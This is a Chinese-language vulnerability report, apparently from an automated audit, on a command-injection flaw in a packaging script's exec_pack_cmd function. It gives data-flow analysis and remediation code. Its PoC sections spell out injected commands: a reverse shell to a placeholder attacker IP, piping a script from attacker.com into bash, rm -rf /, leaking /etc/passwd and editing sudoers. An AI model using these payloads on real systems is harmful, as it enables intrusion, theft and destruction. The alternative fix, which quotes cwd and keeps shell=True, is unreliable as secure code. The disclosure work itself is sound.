# VULN-SEC-001: packer.py 命令注入漏洞深度分析报告

## 基本信息

| 属性 | 值 |
|------|-----|
| 漏洞ID | VULN-SEC-001 |
| 漏洞类型 | 命令注入 (Command Injection) |
| CWE编号 | CWE-78 |
| 严重性 | High |
| 置信度 | 85 (CONFIRMED) |
| 文件位置 | scripts/package/common/py/packer.py:213 |
| 函数名 | exec_pack_cmd |
| 发现者 | security-auditor |

## 漏洞概述

### 漏洞代码片段

```python
# packer.py:204-217
def exec_pack_cmd(delivery_dir: str,
                 pack_cmd: str,
                 package_name: str) -> str: 
    """执行打包命令"""
    if delivery_dir:
        cmd = f'cd {delivery_dir} && {pack_cmd}'
    else:
        cmd = pack_cmd
    CommLog.cilog_info("package cmd:%s", cmd)
    result = subprocess.run(cmd, shell=True, check=False, stdout=PIPE, stderr=STDOUT)
    output = result.stdout.decode()
    if result.returncode != 0:
        CommLog.cilog_error(__file__, "compress package(%s) failed! %s.", package_name, output)
        raise CompressError(package_name)
    return package_name
```

### 漏洞成因

`exec_pack_cmd` 函数使用 `subprocess.run(cmd, shell=True)` 执行系统命令，其中：

1. `cmd` 字符串由 `delivery_dir` 和 `pack_cmd` 参数通过字符串拼接构造
2. `shell=True` 导致命令通过 shell 解析器执行，允许 shell 元字符（如 `;`, `|`, `&`, `$`, `()` 等）生效
3. 参数 `delivery_dir` 和 `pack_cmd` 来自调用者，未经过任何验证或清洗

### 数据流追踪

```
package.py:main()
  └── package.py:get_compress_cmd(delivery_dir=pkg_args.pkg_output_dir, ...)
        └── package.py:72 exec_pack_cmd(delivery_dir, pack_cmd, package_name.getvalue())
              └── packer.py:209 cmd = f'cd {delivery_dir} && {pack_cmd}'
                    └── packer.py:213 subprocess.run(cmd, shell=True) [SINK]

pkg_args.pkg_output_dir 来自 CLI 参数 --pkg-output-dir (package.py:693)
pack_cmd 来自 create_run_package_command() 返回值
```

### 入口点分析

该漏洞的入口点是 `package.py` 的命令行参数解析：

```python
# package.py:693
parser.add_argument('--pkg-output-dir', default='', help='Package dirpath.')
```

用户可以通过 `--pkg-output-dir` 参数传递恶意路径，该路径最终进入 `exec_pack_cmd` 的 `delivery_dir` 参数。

## 攻击场景分析

### 场景1: CI/CD 环境中的恶意输入

**前提条件**：
- 开发者在 CI/CD 流程中调用打包脚本
- CI/CD 配置可能使用动态变量设置输出目录

**攻击方式**：
攻击者如果能够控制 CI/CD 配置或注入恶意环境变量，可以通过设置 `--pkg-output-dir` 参数包含 shell 命令：

```bash
python scripts/package/package.py --pkg-output-dir "/tmp/normal_path; id > /tmp/pwned"
```

这会导致最终执行的命令为：
```bash
cd /tmp/normal_path; id > /tmp/pwned && makeself.sh ...
```

Shell 会解析为：
1. `cd /tmp/normal_path` (正常目录切换)
2. `id > /tmp/pwned` (注入命令，写入用户信息)
3. `&& makeself.sh ...` (后续正常命令)

### 场景2: 通过环境变量污染

如果 `delivery_dir` 或 `pack_cmd` 的值来自环境变量而非 CLI 参数：

```bash
export PKG_OUTPUT_DIR="/safe/path$(curl attacker.com/shell.sh | bash)"
python scripts/package/package.py
```

### 场景3: 供应链攻击

攻击者如果能够在项目中提交恶意配置文件（如 `.xml` 配置文件），通过修改配置影响 `pack_cmd` 的构造：

```xml
<!-- malicious_config.xml -->
<package_attr>
  <cleanup>rm -rf /; echo cleaned</cleanup>
</package_attr>
```

`cleanup` 参数会进入 `compose_makeself_command()` 构造的命令字符串。

## PoC 概念验证

### 基础 PoC

```bash
# 假设打包脚本以以下方式调用
cd /home/pwn20tty/Desktop/opencode_project/cann/5/asc-devkit

# 构造包含命令注入的输出目录参数
python scripts/package/package.py \
  --pkg-name "test" \
  --pkg-output-dir "/tmp/output; touch /tmp/VULN_SEC_001_CONFIRMED"

# 验证注入是否生效
ls -la /tmp/VULN_SEC_001_CONFIRMED
```

### 高危 PoC (反向 Shell)

```bash
# 构造反向 shell 注入
python scripts/package/package.py \
  --pkg-name "test" \
  --pkg-output-dir "/tmp/output; bash -c 'bash -i >& /dev/tcp/ATTacker_IP/4444 0>&1'"
```

### 文件读取 PoC

```bash
# 读取敏感文件
python scripts/package/package.py \
  --pkg-name "test" \
  --pkg-output-dir "/tmp/output; cat /etc/passwd > /tmp/leaked_passwd"
```

### 权限提升 PoC (如脚本以高权限运行)

```bash
# 写入恶意 sudoers 配置
python scripts/package/package.py \
  --pkg-name "test" \
  --pkg-output-dir "/tmp/output; echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
```

## 影响评估

### 直接影响

| 影响类型 | 严重程度 | 说明 |
|----------|----------|------|
| 任意命令执行 | **Critical** | 攻击者可执行任意系统命令 |
| 数据泄露 | High | 可读取任意文件（如 `/etc/passwd`, SSH 密钥） |
| 权限提升 | Critical | 如脚本以 root/sudo 运行，可提权 |
| 系统破坏 | Critical | 可删除关键文件、修改系统配置 |

### 间接影响

1. **CI/CD 流程破坏**：注入命令可能中断构建流程，导致服务中断
2. **供应链污染**：恶意命令可能修改生成的包内容，植入后门
3. **横向移动**：获取 shell 后可进一步攻击内网其他服务

### 前置条件

| 条件 | 必要性 | 说明 |
|------|--------|------|
| 能调用打包脚本 | **必须** | 需有执行 Python 脚本的权限 |
| 能控制 CLI 参数 | **必须** | 或能污染传入脚本的配置/环境变量 |
| 脚本运行权限 | 决定影响范围 | root 权限 → 系统级攻击；用户权限 → 用户级攻击 |

### 受影响环境

- **开发环境**：开发者本地执行打包
- **CI/CD 环境**：自动化构建流程中调用
- **生产发布环境**：发布软件包时调用

## 修复建议

### 推荐: 移除 shell=True

```python
def exec_pack_cmd(delivery_dir: str,
                 pack_cmd_parts: List[str],
                 package_name: str) -> str: 
    """执行打包命令（安全版本）"""
    import shlex
    
    # 方案1: 不使用 shell，直接传递命令列表
    if delivery_dir:
        # 使用 subprocess 不需要 cd，可以设置 cwd 参数
        result = subprocess.run(
            pack_cmd_parts,  # 命令作为列表传递
            cwd=delivery_dir,  # 使用 cwd 参数切换目录
            check=False,
            stdout=PIPE,
            stderr=STDOUT
        )
    else:
        result = subprocess.run(
            pack_cmd_parts,
            check=False,
            stdout=PIPE,
            stderr=STDOUT
        )
    
    output = result.stdout.decode()
    if result.returncode != 0:
        CommLog.cilog_error(__file__, "compress package(%s) failed! %s.", package_name, output)
        raise CompressError(package_name)
    return package_name
```

### 备选方案: 参数验证

```python
def exec_pack_cmd(delivery_dir: str,
                 pack_cmd: str,
                 package_name: str) -> str:
    """执行打包命令（带验证）"""
    import shlex
    import re
    
    # 验证 delivery_dir 不含 shell 元字符
    if delivery_dir:
        if re.search(r'[;&|$\n\r]', delivery_dir):
            raise ValueError(f"Invalid delivery_dir: contains shell metacharacters")
        if not os.path.isdir(delivery_dir):
            raise ValueError(f"delivery_dir does not exist or is not a directory")
    
    # 解析 pack_cmd 为安全列表
    pack_cmd_parts = shlex.split(pack_cmd)
    
    if delivery_dir:
        result = subprocess.run(
            pack_cmd_parts,
            cwd=shlex.quote(delivery_dir),  # 即使使用 shell 也需 quote
            shell=True,  # 如果必须使用 shell
            check=False,
            stdout=PIPE,
            stderr=STDOUT
        )
    else:
        # ...
```

### 调用链修复

需要同时修改 `compose_makeself_command()` 和调用链中的其他函数，确保命令以列表形式传递而非字符串：

```python
def compose_makeself_command(params: MakeselfPkgParams) -> List[str]:
    """组装makeself包打包命令（返回列表）"""
    # 返回命令列表而非字符串
    commands = []
    if params.independent_pkg:
        commands.extend([
            params.makeself_tool, "--header", params.makeself_header,
            "--help-header", params.help_info, compress_tool, '--complevel', '4',
            # ...
        ])
    return commands  # 返回列表，不拼接为字符串
```

### 最佳实践

1. **永远不要使用 `shell=True`**：除非绝对必要
2. **使用 `subprocess.run(cmd_list)` 形式**：命令作为列表传递，避免 shell 解析
3. **使用 `cwd` 参数切换目录**：而非在命令中 `cd`
4. **验证所有外部输入**：确保路径/参数不含危险字符
5. **使用 `shlex.quote()`**：如必须使用 shell，对参数进行引用

## 修复优先级

| 优先级 | 说明 |
|--------|------|
| **P0 - 立即修复** | 命令注入漏洞可导致系统完全沦陷 |

## 相关漏洞

- VULN-SEC-003: 同样的命令注入模式出现在 `ascendc_compile_kernel.py`
- 建议对整个项目进行 `shell=True` 使用审查

---

**报告生成时间**: 2026-04-22  
**分析者**: details-analyzer  
**状态**: CONFIRMED